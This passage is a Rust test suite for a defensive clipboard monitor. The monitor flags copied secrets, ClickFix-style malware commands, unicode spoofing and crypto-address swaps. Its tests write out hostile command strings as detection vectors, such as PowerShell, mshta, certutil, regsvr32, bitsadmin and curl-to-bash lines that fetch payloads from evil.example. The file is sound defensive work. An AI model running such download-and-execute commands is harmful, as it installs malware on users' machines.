    AUTO_CLEAR_ON_LOCK.store(enabled, Ordering::SeqCst);
    Ok(())
}

#[tauri::command]
pub async fn get_paste_monitor_auto_clear_on_lock() -> Result<bool, String> {
    Ok(AUTO_CLEAR_ON_LOCK.load(Ordering::SeqCst))
}

// ═══════════════════════════════════════════════════════════════════════
// TESTS
// ═══════════════════════════════════════════════════════════════════════

#[cfg(test)]
mod tests {
    use super::*;
    use wincmd_clip_rules::{CompiledRuleSet, RuleSetLimits, compile};

    // ── Test helpers ──────────────────────────────────────────────────

    /// Compile this file's free-tier ruleset for `enabled` and return it
    /// plus the id→pattern lookup, WITHOUT touching any global state —
    /// every test below builds its own local ruleset so tests can run in
    /// parallel without interfering with each other.
    fn compiled_for_test(
        enabled: EnabledCategories,
    ) -> (CompiledRuleSet, HashMap<RuleId, MatchedKind>) {
        let (rules, lookup) = build_free_tier_rules(&enabled);
        let compiled =
            compile(&rules, &RuleSetLimits::default()).expect("free-tier ruleset always compiles");
        (compiled, lookup)
    }

    /// Same ruleset, wrapped in a fresh local `PolicyStore` — needed by
    /// tests that exercise `MatchEngine` (cooldown, truncation), which
    /// requires an `ActivePolicy` rather than a bare `CompiledRuleSet`.
    fn installed_policy_for_test(
        enabled: EnabledCategories,
    ) -> (PolicyStore, HashMap<RuleId, MatchedKind>) {
        let (rules, lookup) = build_free_tier_rules(&enabled);
        let mut store = PolicyStore::new();
        store
            .install(&ClipboardPolicyResponse {
                policy_version: FREE_TIER_POLICY_VERSION,
                rules,
            })
            .expect("free-tier ruleset always compiles");
        (store, lookup)
    }

    /// End-to-end match, mirroring exactly what the live loop does: the
    /// same `< 13 bytes` floor, then `evaluate`, then the name/severity
    /// lookup — so these tests prove the REAL production decision, not an
    /// approximation of it.
    fn free_tier_match(
        compiled: &CompiledRuleSet,
        lookup: &HashMap<RuleId, MatchedKind>,
        text: &str,
    ) -> Option<(&'static str, &'static str)> {
        if text.len() < 13 {
            return None;
        }
        let verdict = compiled.evaluate(text)?;
        let kind = *lookup.get(&verdict.rule_id)?;
        Some((kind.display_name(), severity_label(verdict.severity)))
    }

    // ═══════════════════════════════════════════════════════════════
    // Free-tier parity — one (or a few) representative vector(s) per
    // legacy category, proving same detection + same severity tier
    // through the NEW wincmd_clip_rules-backed pipeline (plan's test
    // list: "Behaviour parity for each of the 8 legacy categories").
    // ═══════════════════════════════════════════════════════════════

    #[test]
    fn cloud_api_patterns_detected_as_warning() {
        let (compiled, lookup) = compiled_for_test(EnabledCategories::default());
        assert_eq!(
            free_tier_match(&compiled, &lookup, &format!("AKIA{}", "A".repeat(16))),
            Some(("AWS Access Key", "warning"))
        );
        assert_eq!(
            free_tier_match(&compiled, &lookup, &format!("AIza{}", "A".repeat(35))),
            Some(("Google API Key", "warning"))
        );
        assert_eq!(
            free_tier_match(
                &compiled,
                &lookup,
                &format!("SG.{}.{}", "A".repeat(22), "B".repeat(43))
            ),
            Some(("SendGrid API Key", "warning"))
        );
        assert_eq!(
            free_tier_match(&compiled, &lookup, &format!("key-{}", "a".repeat(32))),
            Some(("Mailgun API Key", "warning"))
        );
        assert_eq!(
            free_tier_match(&compiled, &lookup, &format!("AC{}", "a".repeat(32))),
            Some(("Twilio Account SID", "warning"))
        );
        assert_eq!(
            free_tier_match(&compiled, &lookup, "postgres://user:pass@localhost/db"),
            Some(("Database URL with credentials", "warning"))
        );
    }

    #[test]
    fn ai_api_patterns_detected_as_warning() {
        let (compiled, lookup) = compiled_for_test(EnabledCategories::default());
        assert_eq!(
            free_tier_match(&compiled, &lookup, &format!("sk-proj-{}", "A".repeat(40))),
            Some(("OpenAI Project Key", "warning"))
        );
        assert_eq!(
            free_tier_match(&compiled, &lookup, &format!("sk-{}", "A".repeat(48))),
            Some(("OpenAI API Key", "warning"))
        );
        assert_eq!(
            free_tier_match(&compiled, &lookup, &format!("sk-ant-{}", "A".repeat(20))),
            Some(("Anthropic API Key", "warning"))
        );
    }

    #[test]
    fn dev_tools_patterns_detected_as_warning() {
        let (compiled, lookup) = compiled_for_test(EnabledCategories::default());
        assert_eq!(
            free_tier_match(&compiled, &lookup, &format!("ghp_{}", "A".repeat(36))),
            Some(("GitHub Classic Personal Token", "warning"))
        );
        assert_eq!(
            free_tier_match(
                &compiled,
                &lookup,
                &format!("github_pat_{}", "A".repeat(20))
            ),
            Some(("GitHub Fine-Grained Token", "warning"))
        );
        assert_eq!(
            free_tier_match(&compiled, &lookup, &format!("npm_{}", "A".repeat(36))),
            Some(("NPM Token", "warning"))
        );
    }

    #[test]
    fn plain_pat_word_does_not_fire() {
        // Kept from the legacy test suite: a bare "pat"-adjacent word must
        // never trip the GitHub token detectors.
        let (compiled, lookup) = compiled_for_test(EnabledCategories::default());
        assert_eq!(free_tier_match(&compiled, &lookup, "pat"), None);
        assert_eq!(
            free_tier_match(&compiled, &lookup, "personal access token"),
            None
        );
    }

    #[test]
    fn payment_comms_patterns_detected_as_warning() {
        let (compiled, lookup) = compiled_for_test(EnabledCategories::default());
        assert_eq!(
            free_tier_match(&compiled, &lookup, &format!("sk_live_{}", "A".repeat(24))),
            Some(("Stripe Live Secret", "warning"))
        );
        assert_eq!(
            free_tier_match(&compiled, &lookup, &format!("pk_live_{}", "A".repeat(24))),
            Some(("Stripe Live Publishable", "warning"))
        );
        assert_eq!(
            free_tier_match(&compiled, &lookup, &format!("xoxb-{}", "A".repeat(10))),
            Some(("Slack Token", "warning"))
        );
        assert_eq!(
            free_tier_match(
                &compiled,
                &lookup,
                &format!("{}.{}.{}", "A".repeat(24), "B".repeat(6), "C".repeat(27))
            ),
            Some(("Discord Bot Token", "warning"))
        );
    }

    #[test]
    fn keys_and_crypto_patterns_detected_as_warning() {
        let (compiled, lookup) = compiled_for_test(EnabledCategories::default());
        assert_eq!(
            free_tier_match(&compiled, &lookup, "-----BEGIN RSA PRIVATE KEY-----"),
            Some(("Private Key (PEM)", "warning"))
        );
        assert_eq!(
            free_tier_match(
                &compiled,
                &lookup,
                &format!(
                    "eyJ{}.{}.{}",
                    "A".repeat(10),
                    "B".repeat(10),
                    "C".repeat(10)
                )
            ),
            Some(("JWT", "warning"))
        );
        assert_eq!(
            free_tier_match(&compiled, &lookup, &format!("5{}", "A".repeat(51))),
            Some(("Bitcoin WIF Private Key", "warning"))
        );
        // The dedicated "SSH Private Key Header" name is unreachable in
        // BOTH the legacy engine and this one: its exact text is one of
        // `PrivateKeyPem`'s own alternation branches, so any string
        // matching it also matches the (higher-priority, first-in-list)
        // generic PEM header pattern. Not a regression — see
        // `FREE_TIER_PATTERNS`'s doc comment on priority ordering.
        assert_eq!(
            free_tier_match(&compiled, &lookup, "-----BEGIN OPENSSH PRIVATE KEY-----"),
            Some(("Private Key (PEM)", "warning"))
        );
    }

    #[test]
    fn malicious_command_patterns_detected_as_danger() {
        let (compiled, lookup) = compiled_for_test(EnabledCategories::default());
        assert_eq!(
            free_tier_match(&compiled, &lookup, "powershell -enc SGVsbG8="),
            Some(("PowerShell encoded payload", "danger"))
        );
        assert_eq!(
            free_tier_match(&compiled, &lookup, "powershell -windowstyle hidden"),
            Some(("Hidden PowerShell window", "danger"))
        );
        assert_eq!(
            free_tier_match(&compiled, &lookup, "powershell -executionpolicy bypass"),
            Some(("PowerShell ExecutionPolicy bypass", "danger"))
        );
        assert_eq!(
            free_tier_match(
                &compiled,
                &lookup,
                "iex (irm http://evil.example/payload.ps1)"
            ),
            Some(("PowerShell remote download + execute", "danger"))
        );
        assert_eq!(
            free_tier_match(&compiled, &lookup, "mshta https://evil.example/payload.hta"),
            Some(("mshta web payload", "danger"))
        );
        assert_eq!(
            free_tier_match(
                &compiled,
                &lookup,
                "certutil -urlcache -f https://evil.example/payload.exe"
            ),
            Some(("certutil web download", "danger"))
        );
        assert_eq!(
            free_tier_match(
                &compiled,
                &lookup,
                "regsvr32 /s /u /i:https://evil.example/payload.sct scrobj.dll"
            ),
            Some(("regsvr32 web payload", "danger"))
        );
        assert_eq!(
            free_tier_match(
                &compiled,
                &lookup,
                "bitsadmin /transfer myjob https://evil.example/payload.exe C:\\temp\\payload.exe"
            ),
            Some(("bitsadmin web transfer", "danger"))
        );
        assert_eq!(
            free_tier_match(
                &compiled,
                &lookup,
                "curl https://evil.example/install.sh | bash"
            ),
            Some(("curl/wget pipe to shell", "danger"))
        );
    }

    #[test]
    fn personal_data_credit_card_via_structured_luhn_check() {
        let (compiled, lookup) = compiled_for_test(EnabledCategories::default());
        assert_eq!(
            free_tier_match(&compiled, &lookup, "4532015112830366"),
            Some(("Credit Card Number", "warning"))
        );
        // Same length, last digit flipped — fails the Luhn check digit.
        assert_eq!(
            free_tier_match(&compiled, &lookup, "4532015112830367"),
            None
        );
    }

    #[test]
    fn unicode_anomaly_patterns_detected_as_danger() {
        let (compiled, lookup) = compiled_for_test(EnabledCategories::default());
        assert_eq!(
            free_tier_match(&compiled, &lookup, "report\u{202E}gpj.exe"),
            Some(("Bidi Override (U+202D/E)", "danger"))
        );
        assert_eq!(
            free_tier_match(&compiled, &lookup, "let api\u{200B}Key = 'secretvalue'"),
            Some(("Zero-Width Chars in Code", "danger"))
        );
        assert_eq!(
            free_tier_match(
                &compiled,
                &lookup,
                "Click https://p\u{0430}ypal.com/login to verify"
            ),
            Some(("Confusable URL Host (mixed scripts)", "danger"))
        );
        // A clean URL, no anomaly, must not fire.
        assert_eq!(
            free_tier_match(
                &compiled,
                &lookup,
                "Visit https://example.com/path for details"
            ),
            None
        );
    }

    #[test]
    fn short_text_below_the_legacy_floor_never_matches() {
        // Legacy quirk, kept for byte-for-byte parity: `check_patterns`
        // gated EVERY check (including the unicode ones) behind a
        // `text.len() < 13` floor, so even an unambiguous bidi-override on
        // a very short string never fired. `free_tier_match` replicates
        // that same floor — this pins the behaviour explicitly rather
        // than leaving it as an incidental side effect of a shared helper.
        let (compiled, lookup) = compiled_for_test(EnabledCategories::default());
        assert_eq!(free_tier_match(&compiled, &lookup, "a\u{202E}b"), None);
    }

    #[test]
    fn disabling_malicious_command_suppresses_those_patterns() {
        let mut cats = EnabledCategories::default();
        let text = "powershell -enc SGVsbG8=";

        let (compiled, lookup) = compiled_for_test(cats);
        assert!(free_tier_match(&compiled, &lookup, text).is_some());

        cats.malicious_command = false;
        let (compiled, lookup) = compiled_for_test(cats);
        assert_eq!(free_tier_match(&compiled, &lookup, text), None);
    }

    #[test]
    fn disabling_unicode_suppresses_unicode_anomaly_detection() {
        let mut cats = EnabledCategories::default();
        let text = "Click https://p\u{0430}ypal.com/login to verify";

        let (compiled, lookup) = compiled_for_test(cats);
        assert_eq!(
            free_tier_match(&compiled, &lookup, text),
            Some(("Confusable URL Host (mixed scripts)", "danger"))
        );

        cats.unicode = false;
        let (compiled, lookup) = compiled_for_test(cats);
        assert_eq!(free_tier_match(&compiled, &lookup, text), None);
    }

    // ═══════════════════════════════════════════════════════════════
    // Bounded read (1 MiB truncation) + per-rule cooldown, via
    // `MatchEngine` — the exact engine the live loop drives.
    // ═══════════════════════════════════════════════════════════════

    #[test]
    fn truncation_applies_before_matching_at_a_multibyte_boundary() {
        let (store, _lookup) = installed_policy_for_test(EnabledCategories::default());
        let mut engine = MatchEngine::new();
        // Multi-byte filler so the 1 MiB cut point is guaranteed to land
        // mid-codepoint if truncation weren't UTF-8-boundary-safe.
        let filler: String = "é".repeat(clipboard_guard_helper::read::MAX_CLIPBOARD_READ_BYTES);
        let text = format!("{filler}AKIA{}", "A".repeat(16));
        let outcome = engine.observe(store.active(), &text, Instant::now());
        assert_eq!(
            outcome,
            MatchOutcome::NoMatch,
            "the AWS key lands past the 1 MiB read cap and must not be seen"
        );
    }

    #[test]
    fn repeated_matches_of_the_same_rule_are_suppressed_and_folded() {
        let (store, lookup) = installed_policy_for_test(EnabledCategories::default());
        let mut engine = MatchEngine::new();
        let t0 = Instant::now();

        let key_a = format!("AKIA{}", "A".repeat(16));
        let key_b = format!("AKIA{}", "Z".repeat(16));

        let first = engine.observe(store.active(), &key_a, t0);
        let MatchOutcome::Emit {
            verdict,
            suppressed_since_last,
        } = first
        else {
            panic!("expected the first AWS-key match to emit");
        };
        assert_eq!(suppressed_since_last, 0);
        assert_eq!(
            lookup
                .get(&verdict.rule_id)
                .copied()
                .map(MatchedKind::display_name),
            Some("AWS Access Key")
        );

        // A DIFFERENT AWS key, well within the free-tier cooldown window —
        // must be folded into a count, never a second toast.
        let second = engine.observe(store.active(), &key_b, t0 + Duration::from_secs(5));
        assert_eq!(
            second,
            MatchOutcome::Suppressed {
                rule_id: verdict.rule_id.clone(),
                count: 1
            }
        );
        let third = engine.observe(store.active(), &key_a, t0 + Duration::from_secs(10));
        assert_eq!(
            third,
            MatchOutcome::Suppressed {
                rule_id: verdict.rule_id.clone(),
                count: 2
            }
        );

        // Once the cooldown elapses, the next match emits again and folds
        // in the suppressed count from the window that just ended.
        let after = engine.observe(
            store.active(),
            &key_a,
            t0 + Duration::from_secs(FREE_TIER_COOLDOWN_SECONDS as u64 + 1),
        );
        match after {
            MatchOutcome::Emit {
                suppressed_since_last,
                ..
            } => assert_eq!(suppressed_since_last, 2),
            other => panic!("expected Emit with folded suppressed count, got {other:?}"),
        }
    }

    #[test]
    fn different_rules_have_independent_cooldowns() {
        let (store, _lookup) = installed_policy_for_test(EnabledCategories::default());
        let mut engine = MatchEngine::new();
        let t0 = Instant::now();

        let aws_key = format!("AKIA{}", "A".repeat(16));
        let npm_token = format!("npm_{}", "A".repeat(36));

        assert!(matches!(
            engine.observe(store.active(), &aws_key, t0),
            MatchOutcome::Emit { .. }
        ));
        // A different rule, same instant — its own cooldown hasn't started.
        assert!(matches!(
            engine.observe(store.active(), &npm_token, t0),
            MatchOutcome::Emit { .. }
        ));
    }

    // ═══════════════════════════════════════════════════════════════
    // Toast copy — pinned byte-for-byte (task constraint: "must not
    // change the toast copy or severity strings users already see").
    // ═══════════════════════════════════════════════════════════════

    #[test]
    fn detection_copy_uses_powershell_specific_danger_copy() {
        let (title, body) = detection_copy("PowerShell encoded payload", "danger");
        assert_eq!(title, "WinCommander · Dangerous PowerShell command");
        assert_eq!(
            body,
            "Clipboard contains a PowerShell-style payload (PowerShell encoded payload). \
            Do not paste it into Win+R, Terminal, or PowerShell unless you wrote it yourself."
        );
    }

    #[test]
    fn detection_copy_uses_generic_danger_copy_for_non_powershell() {
        let (title, body) = detection_copy("mshta web payload", "danger");
        assert_eq!(title, "WinCommander · Suspicious clipboard content");
        assert_eq!(
            body,
            "You copied something that looks like a malware payload (mshta web payload). \
            Do not paste this into Win+R, PowerShell, or any terminal. \
            This is the ClickFix / pastejacking trick."
        );
    }

    #[test]
    fn detection_copy_uses_generic_warning_copy() {
        let (title, body) = detection_copy("AWS Access Key", "warning");
        assert_eq!(title, "WinCommander · Paste Monitor");
        assert_eq!(
            body,
            "Looks like you copied a AWS Access Key — be careful where you paste it."
        );
    }

    // ═══════════════════════════════════════════════════════════════
    // Content-free enforcement (plan §8) — end-to-end through THIS
    // file's own match → report path, not just the wire type's shape.
    // ═══════════════════════════════════════════════════════════════

    #[test]
    fn sentinel_clipboard_text_never_appears_in_the_built_report() {
        const SENTINEL: &str = "SENTINEL_MARKER_zzz_do_not_leak_this_9F3C";
        let (store, lookup) = installed_policy_for_test(EnabledCategories::default());
        let mut engine = MatchEngine::new();

        let clipboard_text = format!("{SENTINEL} AKIA{}", "A".repeat(16));
        let outcome = engine.observe(store.active(), &clipboard_text, Instant::now());
        let MatchOutcome::Emit {
            verdict,
            suppressed_since_last,
        } = outcome
        else {
            panic!("expected the AWS-key rule to match and emit");
        };
        let kind = lookup
            .get(&verdict.rule_id)
            .copied()
            .expect("known rule id");
        assert_eq!(kind.display_name(), "AWS Access Key");

        let report = build_pending_report(
            FREE_TIER_POLICY_VERSION,
            &verdict,
            true,
            suppressed_since_last,
        );
        let serialized = serde_json::to_string(&report).expect("report serializes");
        assert!(
            !serialized.contains(SENTINEL),
            "clipboard text leaked into the report: {serialized}"
        );
        assert!(!serialized.contains(&clipboard_text));

        // The DetectionEvent this file emits/logs is built from
        // `kind.display_name()` and a fixed severity label only — never
        // from `clipboard_text` — so its content-free-ness holds
        // structurally, not by convention.
        let event = DetectionEvent {
            pattern: kind.display_name().to_string(),
            severity: severity_label(verdict.severity).to_string(),
            detected_at: chrono::Utc::now().to_rfc3339(),
        };
        let event_json = serde_json::to_string(&event).unwrap();
        assert!(!event_json.contains(SENTINEL));
    }

    #[test]
    fn build_pending_report_signature_cannot_carry_clipboard_text() {
        // Documentation-as-test, mirroring `clipboard_guard_helper::
        // report`'s own equivalent: pins the exact closed field set so a
        // future edit that widens the wire report has to touch this
        // assertion, making the change reviewable rather than silent.
        let rule_id = RuleId::new("0e8f1a2b3c4d5e6f7a8b9c0d1e2f3a4b").unwrap();
        let verdict = Verdict {
            rule_id,
            rule_revision: 1,
            severity: Severity::Warn,
            actions: vec![Action::NotifyUser],
        };
        let report = build_pending_report(1, &verdict, true, 0);
        let value = serde_json::to_value(&report).unwrap();
        let mut fields: Vec<&str> = value
            .as_object()
            .unwrap()
            .keys()
            .map(|s| s.as_str())
            .collect();
        fields.sort_unstable();
        assert_eq!(
            fields,
            vec![
                "actions_attempted",
                "actions_succeeded",
                "event_id",
                "occurred_at",
                "policy_version",
                "rule_id",
                "rule_revision",
                "severity",
                "suppressed_count",
            ]
        );
    }

    // ═══════════════════════════════════════════════════════════════
    // Clear-attempt health bookkeeping — "a failed clear reports
    // attempted-not-succeeded" (plan §9 exit criterion).
    // ═══════════════════════════════════════════════════════════════

    #[test]
    fn failed_clear_reports_clear_failing_true() {
        assert!(clear_health_after_attempt(false));
    }

    #[test]
    fn verified_clear_reports_clear_failing_false() {
        assert!(!clear_health_after_attempt(true));
    }

    // ═══════════════════════════════════════════════════════════════
    // Crypto-address extraction (pure matcher) + swap window/debounce
    // (decide_crypto_swap with injected Instant — no real sleeps).
    // All addresses below are the clearly-fake T1 verification vectors.
    // UNCHANGED by the Phase 1c re-point — see this section's own
    // module-doc note above `CryptoFamily`.
    // ═══════════════════════════════════════════════════════════════

    // Two distinct same-family addresses for each family the swap
    // mechanism is proven against (BTC bech32, ETH, LTC, TRX).
    const BTC_A: &str = "bc1qar0srrr7xfkvy5l643lydnw9re59gtzzwf5mdq";
    const BTC_B: &str = "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh";
    const ETH_A: &str = "0x0000000000000000000000000000000000000001";
    const ETH_B: &str = "0x000000000000000000000000000000000000dEaD";
    const LTC_A: &str = "LdP8Qox1VAhCzLJNqrr74YovaWYyNBUWvL";
    const TRX_A: &str = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";

    fn one(family: CryptoFamily, addr: &str) -> HashMap<CryptoFamily, String> {
        let mut m = HashMap::new();
        m.insert(family, addr.to_string());
        m
    }

    #[test]
    fn extract_crypto_bech32_wins_over_base58_for_bitcoin() {
        // Bech32 is ordered before Base58 P2PKH in CRYPTO_PATTERNS, so a
        // bc1… address must be captured as the single Bitcoin entry even
        // though Base58 patterns could also partially match elsewhere.
        let found = extract_crypto_addresses(&format!("send to {BTC_A}"));
        assert_eq!(
            found.get(&CryptoFamily::Bitcoin).map(|s| s.as_str()),
            Some(BTC_A)
        );
    }

    #[test]
    fn extract_crypto_multiple_families_independently() {
        // A message carrying both a BTC and an ETH address tracks each
        // family separately (first-match-per-family).
        let found = extract_crypto_addresses(&format!("BTC {BTC_A} or ETH {ETH_A}"));
        assert_eq!(
            found.get(&CryptoFamily::Bitcoin).map(|s| s.as_str()),
            Some(BTC_A)
        );
        assert_eq!(
            found.get(&CryptoFamily::Ethereum).map(|s| s.as_str()),
            Some(ETH_A)
        );
    }

    #[test]
    fn base58_decode_known_vectors() {
        // 32 '1' chars → 32 zero bytes; the USDC mint decodes to 32 bytes.
        assert_eq!(
            base58_decode("11111111111111111111111111111111").map(|b| b.len()),
            Some(32)
        );
        assert_eq!(
            base58_decode("EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v").map(|b| b.len()),
            Some(32)
        );
        // A 34-char BTC P2PKH address decodes to 25 bytes, NOT 32.
        assert_eq!(
            base58_decode("1BvBMSEYstWetqTFn5Au4m4GFg7xJaNVN2").map(|b| b.len()),
            Some(25)
        );
        // Out-of-alphabet chars (0/O/I/l) reject.
        assert!(base58_decode("0OIl").is_none());
    }

    #[test]
    fn solana_validation_rejects_btc_lookalike() {
        // A plain BTC P2PKH address is base58 but only 25 decoded bytes, so it
        // must NOT register as a Solana address (the old char-class regex did).
        let found = extract_crypto_addresses("paying 1BvBMSEYstWetqTFn5Au4m4GFg7xJaNVN2");
        assert_eq!(found.get(&CryptoFamily::Solana), None);
    }

    #[test]
    fn solana_validation_accepts_real_pubkey() {
        let sol = "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v";
        let found = extract_crypto_addresses(&format!("mint {sol}"));
        assert_eq!(
            found.get(&CryptoFamily::Solana).map(|s| s.as_str()),
            Some(sol)
        );
    }

    #[test]
    fn swap_first_copy_never_fires() {
        // First time a family is seen there is no prior entry → no swap,
        // but the address IS recorded for next time.
        let mut last = HashMap::new();
        let now = Instant::now();
        assert_eq!(
            decide_crypto_swap(&one(CryptoFamily::Bitcoin, BTC_A), &mut last, now),
            None
        );
        assert!(last.contains_key(&CryptoFamily::Bitcoin));
    }

    #[test]
    fn swap_different_address_within_window_fires() {
        // Copy A, then ~3s later copy a different B → swap fires (T1).
        let mut last = HashMap::new();
        let t0 = Instant::now();
        decide_crypto_swap(&one(CryptoFamily::Bitcoin, BTC_A), &mut last, t0);
        let t1 = t0 + Duration::from_secs(3);
        assert_eq!(
            decide_crypto_swap(&one(CryptoFamily::Bitcoin, BTC_B), &mut last, t1),
            Some(CryptoFamily::Bitcoin)
        );
    }

    #[test]
    fn swap_same_address_twice_does_not_fire() {
        // Copy A then A again → identical address, no swap (T1 case (a)).
        // Re-copy still refreshes the timestamp (sliding window).
        let mut last = HashMap::new();
        let t0 = Instant::now();
        decide_crypto_swap(&one(CryptoFamily::Bitcoin, BTC_A), &mut last, t0);
        let t1 = t0 + Duration::from_secs(5);
        assert_eq!(
            decide_crypto_swap(&one(CryptoFamily::Bitcoin, BTC_A), &mut last, t1),
            None
        );
        assert_eq!(
            last.get(&CryptoFamily::Bitcoin).map(|(_, at)| *at),
            Some(t1)
        );
    }

    #[test]
    fn swap_after_window_expires_does_not_fire() {
        // Copy A, wait > 60s, copy B → treated as a deliberate new copy,
        // not a hijack (T1 case (b)).
        let mut last = HashMap::new();
        let t0 = Instant::now();
        decide_crypto_swap(&one(CryptoFamily::Bitcoin, BTC_A), &mut last, t0);
        let t1 = t0 + Duration::from_secs(61);
        assert_eq!(
            decide_crypto_swap(&one(CryptoFamily::Bitcoin, BTC_B), &mut last, t1),
            None
        );
    }

    #[test]
    fn swap_exactly_at_window_boundary_still_fires() {
        // The window is inclusive (`<= CRYPTO_SWAP_WINDOW`): a change at
        // exactly 60s after the first copy still counts as a swap.
        let mut last = HashMap::new();
        let t0 = Instant::now();
        decide_crypto_swap(&one(CryptoFamily::Bitcoin, BTC_A), &mut last, t0);
        let t1 = t0 + CRYPTO_SWAP_WINDOW;
        assert_eq!(
            decide_crypto_swap(&one(CryptoFamily::Bitcoin, BTC_B), &mut last, t1),
            Some(CryptoFamily::Bitcoin)
        );
    }

    #[test]
    fn swap_sliding_window_refreshes_on_each_copy() {
        // G3 probe: A at t0, A again at t0+55s (refreshes timestamp),
        // then B at t0+100s → still within 60s of the LAST copy, so it
        // fires. Confirms the window slides off the most recent same-
        // family copy, not the original.
        let mut last = HashMap::new();
        let t0 = Instant::now();
        decide_crypto_swap(&one(CryptoFamily::Bitcoin, BTC_A), &mut last, t0);
        decide_crypto_swap(
            &one(CryptoFamily::Bitcoin, BTC_A),
            &mut last,
            t0 + Duration::from_secs(55),
        );
        assert_eq!(
            decide_crypto_swap(
                &one(CryptoFamily::Bitcoin, BTC_B),
                &mut last,
                t0 + Duration::from_secs(100)
            ),
            Some(CryptoFamily::Bitcoin)
        );
    }

    #[test]
    fn swap_three_address_sequence_tracks_latest() {
        // G3 probe: A → B → A. Each step compares against the immediately
        // preceding stored address, and each transition is a distinct
        // address within-window, so every change after the first fires.
        let mut last = HashMap::new();
        let t0 = Instant::now();
        // A: first sighting, no fire.
        assert_eq!(
            decide_crypto_swap(&one(CryptoFamily::Ethereum, ETH_A), &mut last, t0),
            None
        );
        // Second distinct ETH address within the window → fires.
        let t1 = t0 + Duration::from_secs(10);
        assert_eq!(
            decide_crypto_swap(&one(CryptoFamily::Ethereum, ETH_B), &mut last, t1),
            Some(CryptoFamily::Ethereum)
        );
        // Back to A within window → still a change vs stored B → fires.
        let t2 = t1 + Duration::from_secs(10);
        assert_eq!(
            decide_crypto_swap(&one(CryptoFamily::Ethereum, ETH_A), &mut last, t2),
            Some(CryptoFamily::Ethereum)
        );
    }

    #[test]
    fn swap_independent_per_family() {
        // A BTC swap and an unrelated, stable LTC/TRX address in the same
        // tick: only the family that actually changed fires. Seed both,
        // then change only Bitcoin.
        let mut last = HashMap::new();
        let t0 = Instant::now();
        let mut seed = HashMap::new();
        seed.insert(CryptoFamily::Bitcoin, BTC_A.to_string());
        seed.insert(CryptoFamily::Litecoin, LTC_A.to_string());
        seed.insert(CryptoFamily::Tron, TRX_A.to_string());
        assert_eq!(decide_crypto_swap(&seed, &mut last, t0), None);

        let t1 = t0 + Duration::from_secs(2);
        let mut next = HashMap::new();
        next.insert(CryptoFamily::Bitcoin, BTC_B.to_string()); // changed
        next.insert(CryptoFamily::Litecoin, LTC_A.to_string()); // unchanged
        next.insert(CryptoFamily::Tron, TRX_A.to_string()); // unchanged
        assert_eq!(
            decide_crypto_swap(&next, &mut last, t1),
            Some(CryptoFamily::Bitcoin)
        );
    }

    #[test]
    fn swap_empty_clipboard_is_noop() {
        // No crypto address on the clipboard → never fires and leaves the
        // last-seen map untouched.
        let mut last = HashMap::new();
        last.insert(CryptoFamily::Bitcoin, (BTC_A.to_string(), Instant::now()));
        let before = last.len();
        assert_eq!(
            decide_crypto_swap(&HashMap::new(), &mut last, Instant::now()),
            None
        );
        assert_eq!(last.len(), before);
    }

    // ═══════════════════════════════════════════════════════════════
    // Auto-clear deadline / hash-guard timing (should_auto_clear,
    // schedule_clear) — deterministic, no real sleeps. UNCHANGED by the
    // Phase 1c re-point.
    // ═══════════════════════════════════════════════════════════════

    #[test]
    fn auto_clear_before_deadline_does_not_fire() {
        let t0 = Instant::now();
        let h = hash_text("AKIAIOSFODNN7EXAMPLE");
        let pending = schedule_clear(t0, 10, h);
        // 5s in, content unchanged, deadline not reached → no erase.
        assert!(!should_auto_clear(
            pending,
            t0 + Duration::from_secs(5),
            Some(h)
        ));
    }

    #[test]
    fn auto_clear_at_deadline_with_unchanged_content_fires() {
        let t0 = Instant::now();
        let h = hash_text("AKIAIOSFODNN7EXAMPLE");
        let pending = schedule_clear(t0, 10, h);
        // At the deadline, same payload still on the clipboard → erase.
        assert!(should_auto_clear(
            pending,
            t0 + Duration::from_secs(10),
            Some(h)
        ));
        // And comfortably past it.
        assert!(should_auto_clear(
            pending,
            t0 + Duration::from_secs(11),
            Some(h)
        ));
    }

    #[test]
    fn auto_clear_does_not_fire_when_content_changed() {
        // T3 step 4 / G2: user copied something else after the flag →
        // current hash differs from the detection-time hash → no erase.
        let t0 = Instant::now();
        let flagged = hash_text("-----BEGIN RSA PRIVATE KEY-----");
        let pending = schedule_clear(t0, 10, flagged);
        let other = hash_text("just some benign text");
        assert!(!should_auto_clear(
            pending,
            t0 + Duration::from_secs(15),
            Some(other)
        ));
    }

    #[test]
    fn auto_clear_does_not_fire_when_clipboard_unreadable() {
        // G2: a non-text copy (image/file) makes the reader return None →
        // we must NOT erase (we can't prove it's still the flagged payload).
        let t0 = Instant::now();
        let h = hash_text("AKIAIOSFODNN7EXAMPLE");
        let pending = schedule_clear(t0, 10, h);
        assert!(!should_auto_clear(
            pending,
            t0 + Duration::from_secs(15),
            None
        ));
    }

    #[test]
    fn schedule_clear_never_uses_zero_delay() {
        // `secs.max(1)` floor: even a 0s request schedules at least 1s out
        // so the erase never races the user's own paste on the same tick.
        let t0 = Instant::now();
        let h = hash_text("x");
        let (deadline, stored) = schedule_clear(t0, 0, h);
        assert_eq!(deadline, t0 + Duration::from_secs(1));
        assert_eq!(stored, h);
    }

    #[test]
    fn schedule_clear_carries_detection_hash() {
        let t0 = Instant::now();
        let h = hash_text("AKIAIOSFODNN7EXAMPLE");
        let (deadline, stored) = schedule_clear(t0, 30, h);
        assert_eq!(deadline, t0 + Duration::from_secs(30));
        assert_eq!(stored, h);
    }

    #[test]
    fn auto_clear_seconds_clamped_to_range() {
        // Mirrors the [5,600] clamp the set_paste_monitor_auto_clear
        // command applies before storing AUTO_CLEAR_SECONDS (T3 step 6).
        assert_eq!(1u32.clamp(5, 600), 5);
        assert_eq!(9999u32.clamp(5, 600), 600);
        assert_eq!(30u32.clamp(5, 600), 30);
    }

    fn custom_rule(id: &str, actions: Vec<Action>, enabled: bool) -> Rule {
        Rule {
            id: RuleId::new(id).unwrap(),
            revision: 1,
            name: "Personal secret".to_string(),
            enabled,
            priority: 1,
            matcher: MatchKind::Phrase {
                value: "PERSONAL-SECRET".to_string(),
                case_sensitive: true,
            },
            severity: Severity::Warn,
            actions,
            cooldown_seconds: 30,
            snoozable: true,
            locked: false,
        }
    }

    #[test]
    fn local_custom_rules_reject_organisation_actions_fail_closed() {
        let policy = ClipboardPolicyResponse {
            policy_version: 1,
            rules: vec![custom_rule(
                "11111111111111111111111111111111",
                vec![Action::NotifyUser, Action::ReportFleet],
                true,
            )],
        };
        assert!(!local_actions_are_safe(&policy));
